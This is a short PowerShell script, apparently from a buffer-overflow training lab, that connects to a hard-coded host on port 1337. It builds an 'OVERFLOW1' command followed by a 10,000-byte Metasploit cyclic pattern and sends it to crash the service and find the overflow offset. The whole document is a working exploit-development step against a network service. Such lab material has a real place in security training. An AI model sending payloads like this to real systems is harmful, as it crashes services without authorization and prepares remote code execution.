$server = '10.10.173.119'
$port = 1337
[byte[]][char[]]$function = 'OVERFLOW1 '
[byte[]][char[]]$pattern = (msf-pattern_create -l 10000)
$pwnz = $function + $pattern
$socket = [System.Net.Sockets.TcpClient]::new()

try {
    $socket.Client.Connect($server, $port)
}
catch {
    $socket.Close()
    $socket.Dispose()
}

try {
    $socket.Client.Send($pwnz)
    $socket.Close()
    $socket.Dispose()
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}